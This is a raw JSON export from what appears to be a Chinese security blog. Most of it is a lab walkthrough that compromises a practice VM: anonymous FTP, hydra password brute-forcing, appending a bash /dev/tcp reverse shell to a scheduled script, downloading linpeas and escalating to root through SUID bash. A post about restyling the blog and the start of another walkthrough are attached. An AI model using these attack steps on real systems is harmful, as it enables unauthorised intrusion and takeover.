2.\u8e29\u70b9\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ ftp 192.168.205.152\nConnected to 192.168.205.152.\n220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.205.152]\nName (192.168.205.152:kali): anonymous\n331 Anonymous login ok, send your complete email address as your password\nPassword: \n230-Welcome, archive user anonymous@192.168.205.128 !\n230-\n230-The local time is: Sun Feb 09 09:57:05 2025\n230-\n230-This is an experimental FTP server.  If you have any unusual problems,\n230-please report them via e-mail to <sky@funbox9>.\n230-\n230 Anonymous access granted, restrictions apply\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls -la\n229 Entering Extended Passive Mode (|||13045|)\n150 Opening ASCII mode data connection for file list\ndrwxr-xr-x   2 ftp      ftp          4096 Jun  5  2021 .\ndrwxr-xr-x   2 ftp      ftp          4096 Jun  5  2021 ..\n-rw-r--r--   1 ftp      ftp           169 Jun  5  2021 welcome.msg\n226 Transfer complete\nftp> mget welcome.msg\nmget welcome.msg [anpqy?]? y                                                                                                         \n229 Entering Extended Passive Mode (|||48839|)\n150 Opening BINARY mode data connection for welcome.msg (169 bytes)\n100% |******************************************************************************************|   169        5.55 MiB/s    00:00 ETA\n226 Transfer complete\n169 bytes received in 00:00 (150.30 KiB/s)\nftp> exit\n221 Goodbye.\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat welcome.msg \nWelcome, archive user %U@%R !\n\nThe local time is: %T\n\nThis is an experimental FTP server.  If you have any unusual problems,\nplease report them via e-mail to <sky@%L>.\n\n                \n```\n\nsky\u53ef\u80fd\u662f\u4e00\u4e2a\u7528\u6237\uff0c\u7ee7\u7eed\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ gobuster dir -u http://192.168.205.152 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v '403'\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.205.152\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              html,txt,md,php\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/index.html           (Status: 200) [Size: 10310]\n/.                    (Status: 200) [Size: 10310]\n\n```\n\n\u5c31\u4e00\u4e2a\u9ed8\u8ba4\u9875\uff0c\u9875\u9762\u65e0\u9690\u85cf\uff0c\u7206\u7834ssh,ftp\uff08mysql\uff0c\u8981\u662f\u771f\u6ca1\u6709\u518d\u8bf4\uff09\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ hydra -L user -P /usr/share/wordlists/q5000.txt ssh://192.168.205.152 -V -I -u -f -e nsr -t 64\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-09 18:01:18\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 64 tasks per 1 server, overall 64 tasks, 10006 login tries (l:2/p:5003), ~157 tries per task\n[DATA] attacking ssh://192.168.205.152:22/\n\n```\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ hydra -L user -P /usr/share/wordlists/q5000.txt ftp://192.168.205.152 -V -I -u -f -e nsr -t 64\n\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-09 18:01:04\n[DATA] max 64 tasks per 1 server, overall 64 tasks, 10006 login tries (l:2/p:5003), ~157 tries per task\n[DATA] attacking ftp://192.168.205.152:21/\n\n[21][ftp] host: 192.168.205.152   login: sky   password: thebest\n[STATUS] attack finished for 192.168.205.152 (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-09 18:02:53\n\n```\n\nftp\u6709\u7ed3\u679c\uff0c\u4e0a\u53bb\u770b\u770b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ ftp 192.168.205.152\nConnected to 192.168.205.152.\n220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.205.152]\nName (192.168.205.152:kali): sky\n331 Password required for sky\nPassword: \n230 User sky logged in\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls -la\n229 Entering Extended Passive Mode (|||39399|)\n150 Opening ASCII mode data connection for file list\ndrwxr-xr-x   3 sky      sky          4096 Jun  6  2021 .\ndrwxr-xr-x   5 root     root         4096 Jun  5  2021 ..\n-rw-------   1 sky      sky            56 Jun  5  2021 .bash_history\n-r--r--r--   1 sky      sky           220 Jun  5  2021 .bash_logout\n-r--r--r--   1 sky      sky          3771 Jun  5  2021 .bashrc\n-r--r--r--   1 sky      sky           807 Jun  5  2021 .profile\ndrwxr-----   2 root     root         4096 Jun  5  2021 .ssh\n-rwxr-x---   1 sky      sarah          66 Jun  6  2021 user.flag\n-rw-------   1 sky      sky          1489 Jun  5  2021 .viminfo\n226 Transfer complete\nftp> mget *\nmget user.flag [anpqy?]? y\n229 Entering Extended Passive Mode (|||51733|)\n150 Opening BINARY mode data connection for user.flag (66 bytes)\n100% |******************************************************************************************|    66        1.65 MiB/s    00:00 ETA\n226 Transfer complete\n66 bytes received in 00:00 (41.31 KiB/s)\nftp> exit\n221 Goodbye.\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat user.flag \n#!/bin/sh\necho 'Your flag is:88jjggzzZhjJjkOIiu76TggHjoOIZTDsDSd'\n              \n```\n\n\u6709\u4e2a\u811a\u672c\uff0c\u6709\u70b9\u50cf\u540e\u53f0\u811a\u672c\uff0c\u6211\u4eec\u52a0\u4e2ashell\u4e0a\u53bb\u8bd5\u8bd5\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ echo 'bash -i >&/dev/tcp/192.168.205.128/8888 0>&1' >> user.flag\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ ftp 192.168.205.152\nConnected to 192.168.205.152.\n220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.205.152]\nName (192.168.205.152:kali): sky\n331 Password required for sky\nPassword: \n230 User sky logged in\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls -la\n229 Entering Extended Passive Mode (|||24304|)\n150 Opening ASCII mode data connection for file list\ndrwxr-xr-x   3 sky      sky          4096 Jun  6  2021 .\ndrwxr-xr-x   5 root     root         4096 Jun  5  2021 ..\n-rw-------   1 sky      sky            56 Jun  5  2021 .bash_history\n-r--r--r--   1 sky      sky           220 Jun  5  2021 .bash_logout\n-r--r--r--   1 sky      sky          3771 Jun  5  2021 .bashrc\n-r--r--r--   1 sky      sky           807 Jun  5  2021 .profile\ndrwxr-----   2 root     root         4096 Jun  5  2021 .ssh\n-rwxr-x---   1 sky      sarah          66 Jun  6  2021 user.flag\n-rw-------   1 sky      sky          1489 Jun  5  2021 .viminfo\n226 Transfer complete\nftp> put user.flag \nlocal: user.flag remote: user.flag\n229 Entering Extended Passive Mode (|||53542|)\n150 Opening BINARY mode data connection for user.flag\n100% |******************************************************************************************|   111        2.35 MiB/s    00:00 ETA\n226 Transfer complete\n111 bytes sent in 00:00 (117.56 KiB/s)\n\n```\n\n\u53e6\u5916\u7a97\u53e3\u76d1\u6d4b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc -lvnp 8888\nlistening on [any] 8888 ...\nconnect to [192.168.205.128] from (UNKNOWN) [192.168.205.152] 52670\nbash: cannot set terminal process group (-1): Inappropriate ioctl for device\nbash: no job control in this shell\nbash-4.4$ id\nid\nuid=1002(sarah) gid=1002(sarah) groups=1002(sarah)\n\n```\n\n# 3. \u83b7\u5f97\u7a33\u5b9a\u7684 Shell\n\n\u83b7\u53d6**\u53cd\u5411 shell** \u540e\uff0c\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u83b7\u5f97\u7a33\u5b9a\u7684**\u4ea4\u4e92\u5f0f** **TTY shell**\uff1a\n\n```bash\nscript /dev/null -c bash  \nctrl+z  \nstty raw -echo; fg  \nreset xterm  \nexport TERM=xterm  \necho $SHELL  \nexport SHELL=/bin/bash  \nstty rows 59 cols 236\n```\n\n# 4.\u63d0\u6743\n\n```\nbash-4.4$ sudo -l\n[sudo] password for sarah: \nbash-4.4$ ls -al\ntotal 36\ndr-xr-xr-x 4 sarah sarah 4096 Jun  6  2021 .\ndrwxr-xr-x 5 root  root  4096 Jun  5  2021 ..\n-r--r--r-- 1 sarah sarah  220 Jun  5  2021 .bash_logout\n-r--r--r-- 1 sarah sarah 3771 Jun  5  2021 .bashrc\ndr-x------ 2 sarah sarah 4096 Jun  5  2021 .cache\ndr-x------ 3 sarah sarah 4096 Jun  5  2021 .gnupg\n-r--r--r-- 1 sarah sarah  807 Jun  5  2021 .profile\n-r--rw-r-- 1 sarah sarah   74 Jun  5  2021 .selected_editor\n-r-------- 1 sarah sarah 3214 Jun  6  2021 .viminfo\nbash-4.4$ cd ..\nbash-4.4$ ls -la\ntotal 20\ndrwxr-xr-x  5 root  root  4096 Jun  5  2021 .\ndrwxr-xr-x 24 root  root  4096 Jun  5  2021 ..\ndrwxr-xr-x  4 lucy  lucy  4096 Jun  6  2021 lucy\ndr-xr-xr-x  4 sarah sarah 4096 Jun  6  2021 sarah\ndrwxr-xr-x  3 sky   sky   4096 Jun  6  2021 sky\nbash-4.4$ cd lucy/\nbash-4.4$ ls -al\ntotal 36\ndrwxr-xr-x 4 lucy lucy 4096 Jun  6  2021 .\ndrwxr-xr-x 5 root root 4096 Jun  5  2021 ..\n-rw------- 1 lucy lucy  192 Jun  6  2021 .bash_history                                                                               \n-rw-r--r-- 1 lucy lucy  220 Apr  4  2018 .bash_logout\n-rw-r--r-- 1 lucy lucy 3771 Apr  4  2018 .bashrc\ndrwx------ 2 lucy lucy 4096 Jun  5  2021 .cache\ndrwx------ 3 lucy lucy 4096 Jun  5  2021 .gnupg\n-rw-r--r-- 1 lucy lucy  807 Apr  4  2018 .profile\n-rw-r--r-- 1 lucy lucy    0 Jun  5  2021 .sudo_as_admin_successful\n-rw------- 1 lucy lucy  702 Jun  6  2021 .viminfo\nbash-4.4$ cd ..\nbash-4.4$ ls -al\ntotal 20\ndrwxr-xr-x  5 root  root  4096 Jun  5  2021 .\ndrwxr-xr-x 24 root  root  4096 Jun  5  2021 ..\ndrwxr-xr-x  4 lucy  lucy  4096 Jun  6  2021 lucy\ndr-xr-xr-x  4 sarah sarah 4096 Jun  6  2021 sarah\ndrwxr-xr-x  3 sky   sky   4096 Jun  6  2021 sky\nbash-4.4$ cd sky/\nbash-4.4$ ls -al\ntotal 36\ndrwxr-xr-x 3 sky  sky   4096 Jun  6  2021 .\ndrwxr-xr-x 5 root root  4096 Jun  5  2021 ..\n-rw------- 1 sky  sky     56 Jun  5  2021 .bash_history\n-r--r--r-- 1 sky  sky    220 Jun  5  2021 .bash_logout\n-r--r--r-- 1 sky  sky   3771 Jun  5  2021 .bashrc\n-r--r--r-- 1 sky  sky    807 Jun  5  2021 .profile\ndrwxr----- 2 root root  4096 Jun  5  2021 .ssh\n-rwxr-x--- 1 sky  sarah  111 Feb  9 10:04 user.flag\n-rw------- 1 sky  sky   1489 Jun  5  2021 .viminfo\nbash-4.4$ find / -perm -4000 -type f 2>/dev/null\n/bin/su\n/bin/fusermount\n/bin/ping\n/bin/mount\n/bin/umount\n/usr/bin/gpasswd\n/usr/bin/traceroute6.iputils\n/usr/bin/chsh\n/usr/bin/sudo\n/usr/bin/procmail\n/usr/bin/newgidmap\n/usr/bin/newuidmap\n/usr/bin/pkexec\n/usr/bin/at\n/usr/bin/passwd\n/usr/bin/newgrp\n/usr/bin/chfn\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/snapd/snap-confine\n/usr/lib/policykit-1/polkit-agent-helper-1\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic\n\n```\n\n\u4f20\u811a\u672c\uff08\u5176\u5b9e\u662f\u6211\u9776\u673a\u62bd\u98ce\u4e86\uff0c\u5c11\u4e86\u4e2abash\uff09\n\n```\nbash-4.4$ wget 192.168.205.128/linpeas.sh\n--2025-02-09 10:08:54--  http://192.168.205.128/linpeas.sh\nConnecting to 192.168.205.128:80... failed: Connection refused.\nbash-4.4$ wget 192.168.205.128/linpeas.sh\n--2025-02-09 10:08:59--  http://192.168.205.128/linpeas.sh\nConnecting to 192.168.205.128:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 839766 (820K) [text/x-sh]\nSaving to: \u2018linpeas.sh\u2019\n\nlinpeas.sh                                                   0%[                                                                       linpeas.sh                                                 100%[========================================================================================================================================>] 820.08K  --.-KB/s    in 0.003s  \n\n2025-02-09 10:08:59 (269 MB/s) - \u2018linpeas.sh\u2019 saved [839766/839766]\n\nbash-4.4$ chmod +x linpeas.sh \nbash-4.4$ bash linpeas.sh \n```\n\n\u4e5f\u6ca1\u6709\uff0c\u91cd\u88c5\u5427\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc -lvnp 8888\nlistening on [any] 8888 ...\nid\nconnect to [192.168.205.128] from (UNKNOWN) [192.168.205.152] 48504\nbash: cannot set terminal process group (-1): Inappropriate ioctl for device\nbash: no job control in this shell\nbash-4.4$ id\nuid=1002(sarah) gid=1002(sarah) groups=1002(sarah)\nbash-4.4$ find / -perm -4000 -type f 2>/dev/null\nfind / -perm -4000 -type f 2>/dev/null\n/bin/bash\n/bin/su\n/bin/fusermount\n/bin/ping\n/bin/mount\n/bin/umount\n/usr/bin/gpasswd\n/usr/bin/traceroute6.iputils\n/usr/bin/chsh\n/usr/bin/sudo\n/usr/bin/procmail\n/usr/bin/newgidmap\n/usr/bin/newuidmap\n/usr/bin/pkexec\n/usr/bin/at\n/usr/bin/passwd\n/usr/bin/newgrp\n/usr/bin/chfn\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/snapd/snap-confine\n/usr/lib/policykit-1/polkit-agent-helper-1\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic\n\n```\n\nbash -p\n\n```\nbash-4.4$ bash -p\nbash -p\nid\nuid=1002(sarah) gid=1002(sarah) euid=0(root) egid=0(root) groups=0(root),1002(sarah)\n\n```sentence", "top": 0, "createdAt": 1751016846, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P123": {"htmlDir": "docs/post/\u2728 -huan-ran-yi-xin-\uff1a-wo-de-bo-ke-jie-mian-mei-hua-zhi-lv- \u2728.html", "labels": ["\u7ef4\u62a4"], "postTitle": "\u2728 \u7115\u7136\u4e00\u65b0\uff1a\u6211\u7684\u535a\u5ba2\u754c\u9762\u7f8e\u5316\u4e4b\u65c5 \u2728", "postUrl": "post/%E2%9C%A8%20-huan-ran-yi-xin-%EF%BC%9A-wo-de-bo-ke-jie-mian-mei-hua-zhi-lv-%20%E2%9C%A8.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/123", "commentNum": 0, "wordCount": 1065, "description": "\u5927\u5bb6\u597d\uff01\n\n\u6700\u8fd1\u5982\u679c\u4f60\u7ecf\u5e38\u8bbf\u95ee\u6211\u7684\u535a\u5ba2\uff0c\u53ef\u80fd\u4f1a\u53d1\u73b0\u5b83\u6084\u6084\u5730\u201c\u53d8\u8138\u201d\u4e86\uff01\u6ca1\u9519\uff0c\u5728\u8fc7\u53bb\u7684\u4e00\u6bb5\u65f6\u95f4\u91cc\uff0c\u6211\u6295\u5165\u4e86\u4e0d\u5c11\u7cbe\u529b\u5bf9\u535a\u5ba2\u7684\u524d\u7aef\u754c\u9762\u8fdb\u884c\u4e86\u4e00\u6b21\u6bd4\u8f83\u5168\u9762\u7684\u7f8e\u5316\u548c\u5347\u7ea7\u3002\u76ee\u7684\u5f88\u7b80\u5355\uff1a**\u63d0\u5347\u9605\u8bfb\u4f53\u9a8c\uff0c\u8ba9\u5b83\u770b\u8d77\u6765\u66f4\u73b0\u4ee3\u3001\u66f4\u8212\u670d\uff01**\n\n\u8fd9\u6b21\u201c\u7f8e\u5bb9\u624b\u672f\u201d\u4e3b\u8981\u5305\u542b\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u9762\uff1a\n\n### 1. \u79fb\u52a8\u7aef\u4f53\u9a8c\u5927\u4f18\u5316 \ud83d\udcf1\n\n\u6211\u77e5\u9053\u5f88\u591a\u670b\u53cb\u4e60\u60ef\u7528\u624b\u673a\u6d4f\u89c8\uff0c\u6240\u4ee5\u79fb\u52a8\u7aef\u7684\u4f18\u5316\u662f\u91cd\u4e2d\u4e4b\u91cd\uff1a\n\n*   **\u544a\u522b\u9519\u4f4d**\uff1a\u4fee\u590d\u4e86\u4e4b\u524d\u624b\u673a\u7aef\u9996\u9875\u5934\u50cf\u6709\u65f6\u4f1a\u201c\u4e71\u8dd1\u201d\u7684\u95ee\u9898\u3002\n*   **\u5bfc\u822a\u52a9\u624b**\uff1a\u4e3a\u6587\u7ae0\u9875\u9762\u6dfb\u52a0\u4e86**\u6d6e\u52a8\u76ee\u5f55\u6309\u94ae**\u548c**\u56de\u5230\u9876\u90e8\u6309\u94ae**\u3002\u73b0\u5728\uff0c\u5373\u4f7f\u662f\u957f\u7bc7\u5927\u8bba\uff0c\u4e5f\u80fd\u8f7b\u677e\u5b9a\u4f4d\u548c\u8fd4\u56de\u9876\u90e8\u5566\uff01\n*   **\u5e03\u5c40\u9002\u914d**\uff1a\u6574\u4f53\u8c03\u6574\u4e86\u8fb9\u8ddd\u3001\u5361\u7247\u6837\u5f0f\u548c\u5b57\u4f53\u5927\u5c0f\uff0c\u4f7f\u5176\u5728\u5c0f\u5c4f\u5e55\u4e0a\u663e\u793a\u66f4\u52a0\u548c\u8c10\u3002\n\n### 2. \u89c6\u89c9\u98ce\u683c\u5168\u9762\u9769\u65b0 \ud83c\udfa8\n\n\u65e0\u8bba\u662f\u684c\u9762\u7aef\u8fd8\u662f\u79fb\u52a8\u7aef\uff0c\u6574\u4f53\u89c6\u89c9\u98ce\u683c\u90fd\u8fdb\u884c\u4e86\u4e00\u6b21\u5347\u7ea7\uff1a\n\n*   **\u66f4\u67d4\u548c\u7684\u89c2\u611f**\uff1a\u91c7\u7528\u4e86\u5e26\u6709\u900f\u660e\u5ea6\u548c\u6a21\u7cca\u6548\u679c\u7684\u80cc\u666f\u4e0e\u5361\u7247\u8bbe\u8ba1\uff08\u7c7b\u4f3c\u6bdb\u73bb\u7483\u6548\u679c\uff09\uff0c\u589e\u52a0\u4e86\u9875\u9762\u7684\u5c42\u6b21\u611f\u3002\n*   **\u7cbe\u81f4\u7684\u7ec6\u8282**\uff1a\u4f18\u5316\u4e86\u5706\u89d2\u3001\u9634\u5f71\u548c\u8fb9\u6846\uff0c\u8ba9\u5143\u7d20\u770b\u8d77\u6765\u66f4\u52a0\u7ec6\u817b\u3002\u5217\u8868\u9879\u3001\u6807\u7b7e\u3001\u6309\u94ae\u7b49\u90fd\u6dfb\u52a0\u4e86\u66f4\u5e73\u6ed1\u7684\u60ac\u505c\u6548\u679c\u548c\u8fc7\u6e21\u52a8\u753b\u3002\n*   **\u73b0\u4ee3\u611f\u5b57\u4f53\u4e0e\u6392\u7248**\uff1a\u5fae\u8c03\u4e86\u5b57\u4f53\u3001\u884c\u9ad8\u548c\u6bb5\u843d\u95f4\u8ddd\uff0c\u529b\u6c42\u66f4\u4f73\u7684\u9605\u8bfb\u8212\u9002\u5ea6\u3002\u6587\u7ae0\u6807\u9898\u4e5f\u66f4\u52a0\u9192\u76ee\u3002\n\n### 3. \u6027\u80fd\u4f18\u5316\uff1a\u5b9a\u5236\u61d2\u52a0\u8f7d \ud83d\ude80\n\n\u8003\u8651\u5230\u7f51\u7ad9\u56fe\u7247\u57fa\u672c\u90fd\u4f7f\u7528\u4e86 jsDelivr CDN\uff0c\u4e3a\u4e86\u8fdb\u4e00\u6b65\u63d0\u5347\u52a0\u8f7d\u901f\u5ea6\uff1a\n\n*   **\u61d2\u52a0\u8f7d\u4e0a\u7ebf**\uff1a\u6211\u7f16\u5199\u5e76\u90e8\u7f72\u4e86\u4e00\u4e2a**\u5b9a\u5236\u7684\u56fe\u7247\u61d2\u52a0\u8f7d\u811a\u672c**\u3002\u73b0\u5728\uff0c\u9875\u9762\u4e2d\u7684\u56fe\u7247\uff08\u9664\u4e86\u5934\u50cf\u548c\u90e8\u5206\u5c0f\u56fe\u6807\uff09\u53ea\u6709\u5728\u5373\u5c06\u6eda\u52a8\u5230\u89c6\u53e3\u65f6\u624d\u4f1a\u52a0\u8f7d\uff0c\u8fd9\u5bf9\u4e8e\u56fe\u7247\u8f83\u591a\u7684\u6587\u7ae0\u9875\u9762\u6548\u679c\u5c24\u5176\u660e\u663e\uff0c\u53ef\u4ee5\u6709\u6548\u51cf\u5c11\u521d\u59cb\u52a0\u8f7d\u65f6\u95f4\u3002\n*   **\u544a\u522b\u7b2c\u4e09\u65b9\u5e93**\uff1a\u66ff\u6362\u6389\u4e86\u4e4b\u524d\u5c1d\u8bd5\u4f7f\u7528\u7684\u7b2c\u4e09\u65b9\u61d2\u52a0\u8f7d\u5e93\uff0c\u73b0\u5728\u8fd9\u4e2a\u529f\u80fd\u5b8c\u5168\u7531\u6211\u4eec\u81ea\u5df1\u638c\u63a7\uff0c\u66f4\u8d34\u5408\u535a\u5ba2\u7684\u5b9e\u9645\u9700\u6c42\u3002\n\n### 4. \u4fa7\u8fb9\u680f\u4fe1\u606f\u5361\u7247 \ud83d\udcca\n\n\u5982\u679c\u4f60\u5728\u684c\u9762\u7aef\u8bbf\u95ee\uff0c\u5e94\u8be5\u80fd\u770b\u5230\u9875\u9762\u5de6\u4fa7\uff08\u6216\u7279\u5b9a\u4f4d\u7f6e\uff09\u65b0\u589e\u4e86\u4e00\u4e2a**\u4fe1\u606f\u7edf\u8ba1\u5361\u7247**\uff0c\u5c55\u793a\u4e86\u7f51\u7ad9\u8fd0\u884c\u5929\u6570\u3001\u8bbf\u95ee\u91cf\u7b49\u6570\u636e\uff0c\u589e\u6dfb\u4e86\u4e00\u70b9\u5c0f\u5c0f\u7684\u201c\u4eea\u5f0f\u611f\u201d\u3002\n\n---\n\n\u8fd9\u6b21\u6539\u52a8\u4e3b\u8981\u6d89\u53ca\u5927\u91cf\u7684 CSS \u6837\u5f0f\u8c03\u6574\u548c\u4e00\u4e9b JavaScript \u811a\u672c\u7684\u4f18\u5316\u4e0e\u7f16\u5199\u3002\u867d\u7136\u8fc7\u7a0b\u6709\u70b9\u7e41\u7410\uff08\u5c24\u5176\u662f\u8c03\u8bd5\u5404\u79cd\u7ec6\u8282\ud83d\ude02\uff09\uff0c\u4f46\u770b\u5230\u6700\u7ec8\u7684\u6548\u679c\uff0c\u611f\u89c9\u8fd8\u662f\u633a\u503c\u5f97\u7684\u3002\n\n**\u6b22\u8fce\u5927\u5bb6\u5230\u5904\u70b9\u70b9\u770b\uff0c\u4f53\u9a8c\u4e00\u4e0b\u65b0\u754c\u9762\uff01** \u5982\u679c\u5728\u6d4f\u89c8\u8fc7\u7a0b\u4e2d\u53d1\u73b0\u4efb\u4f55\u663e\u793a\u5f02\u5e38\u3001\u6837\u5f0f\u9519\u4e71\uff0c\u6216\u8005\u6709\u4efb\u4f55\u6539\u8fdb\u5efa\u8bae\uff0c\u8bf7\u52a1\u5fc5\u901a\u8fc7\u8bc4\u8bba\u544a\u8bc9\u6211\uff0c\u6211\u4f1a\u5c3d\u5feb\u4fee\u590d\u548c\u5b8c\u5584\uff01\n\n\u611f\u8c22\u5927\u5bb6\u7684\u5173\u6ce8\u548c\u652f\u6301\uff01sentence", "top": 0, "createdAt": 1751016849, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P124": {"htmlDir": "docs/post/nei-bu-_Qingmei.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Qingmei", "postUrl": "post/nei-bu-_Qingmei.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/124", "commentNum": 0, "wordCount": 8880, "description": "## 1. \u4fe1\u606f\u6536\u96c6\n\n### 1.1 \u4e3b\u673a\u53d1\u73b0\n\n\u4f7f\u7528 `arp-scan` \u5de5\u5177\u5bf9\u672c\u5730\u7f51\u7edc `192.168.205.0/24` \u8fdb\u884c\u626b\u63cf\uff0c\u4ee5\u8bc6\u522b\u76ee\u6807\u4e3b\u673a\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ sudo arp-scan -l\n[sudo] password for kali:\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan )\n192.168.205.1   00:50:56:c0:00:08       VMware, Inc.\n192.168.205.2   00:50:56:f4:ef:6f       VMware, Inc.\n192.168.205.218 08:00:27:83:ca:3c       PCS Systemtechnik GmbH\n192.168.205.254 00:50:56:ed:bd:56       VMware, Inc.\n\n4 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 1.974 seconds (129.69 hosts/sec). 4 responded\n```\n\n**\u7ed3\u679c\uff1a** \u76ee\u6807\u4e3b\u673a IP \u5730\u5740\u786e\u8ba4\u4e3a `192.168.205.218`\u3002\n\n### 1.2 \u7aef\u53e3\u626b\u63cf\u4e0e\u670d\u52a1\u8bc6\u522b\n\n\u4f7f\u7528 `nmap` \u5bf9\u76ee\u6807\u4e3b\u673a `192.168.205.218` \u8fdb\u884c\u5168\u7aef\u53e3 TCP \u626b\u63cf\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ nmap -p- --min-rate 10000 192.168.205.218\nStarting Nmap 7.95 ( https://nmap.org  ) at 2025-05-18 22:55 EDT\nNmap scan report for 192.168.205.218\nHost is up (0.00028s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:83:CA:3C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.12 seconds\n```\n\n\u8fdb\u4e00\u6b65\u5bf9\u5f00\u653e\u7aef\u53e3\u8fdb\u884c\u670d\u52a1\u7248\u672c\u63a2\u6d4b\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ nmap -p22,80 -sV 192.168.205.218\nStarting Nmap 7.95 ( https://nmap.org  ) at 2025-05-19 08:30 EDT\nNmap scan report for 192.168.205.218\nHost is up (0.00031s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.62 ((Debian))\nMAC Address: 08:00:27:83:CA:3C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/  .\nNmap done: 1 IP address (1 host up) scanned in 7.85 seconds\n```\n\n**\u7ed3\u679c\uff1a** \u76ee\u6807\u4e3b\u673a\u5f00\u653e\u4e86 SSH \u670d\u52a1 (OpenSSH 8.9p1, \u7aef\u53e3 22) \u548c HTTP \u670d\u52a1 (Apache httpd 2.4.62, \u7aef\u53e3 80)\u3002\n\n## 2. \u6f0f\u6d1e\u5206\u6790\u4e0e\u5229\u7528\n\n### 2.1 Web \u670d\u52a1\u63a2\u6d4b\n\n\u5bf9\u76ee\u6807 80 \u7aef\u53e3\u7684 HTTP \u670d\u52a1\u8fdb\u884c\u521d\u6b65\u63a2\u6d4b\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ curl -v http://192.168.205.218\n*   Trying 192.168.205.218:80...\n* Connected to 192.168.205.218 (192.168.205.218) port 80\n* using HTTP/1.x\n> GET / HTTP/1.1\n> Host: 192.168.205.218\n> User-Agent: curl/8.13.0\n> Accept: */*\n>\n* Request completely sent off\n< 